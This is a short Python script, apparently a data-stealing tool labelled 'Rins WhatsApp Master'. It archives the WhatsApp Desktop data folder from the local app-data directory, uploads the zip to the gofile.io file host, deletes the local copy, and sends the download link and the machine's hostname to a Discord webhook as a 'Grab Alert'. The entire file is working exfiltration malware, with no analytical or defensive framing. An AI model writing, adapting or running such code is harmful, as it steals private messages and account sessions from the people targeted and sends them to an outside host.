import dhooks 
import os
import requests
import time
import socket
import shutil

# PSG > OM

WEBHOOK = "Rins on top"
direct = f"{os.getenv('LOCALAPPDATA')}\\Packages\\5319275A.WhatsAppDesktop_cv1g1gvanyjgm"
print(direct)

def uploadToGofile(path):
    for x in range(10):
        try:
            rr = requests.post(
                f'https://{requests.get("https://api.gofile.io/getServer").json()["data"]["server"]}.gofile.io/uploadFile',
                files={
                    "file": open(path, "rb")
                },
            ).json()["data"]["downloadPage"]
            return rr
        except Exception:
            time.sleep(2)
    return False

try:
    shutil.make_archive("ssouput", "zip", direct)
except Exception: 
    pass

m = uploadToGofile(f"{os.getcwd()}\\ssouput.zip")
os.remove(f"{os.getcwd()}\\ssouput.zip")

message = f"**Rins WhatsApp Master Report**\n\n"
message += f"📌 Pc: {socket.gethostname()}\n"
message += f"🔍 Url: {m}"

embed = dhooks.Embed(
    title="🔔 Grab Alert",
    description=message,
    color=0xFF5733
)

webhook = dhooks.Webhook(
    url=WEBHOOK,
    username="Rins WhatsApp Master",
    avatar_url="https://github.com/rinsfx/WhatsappMaster/blob/master/assets/whatsapp.png?raw=true"
)
webhook.send(embed=embed)
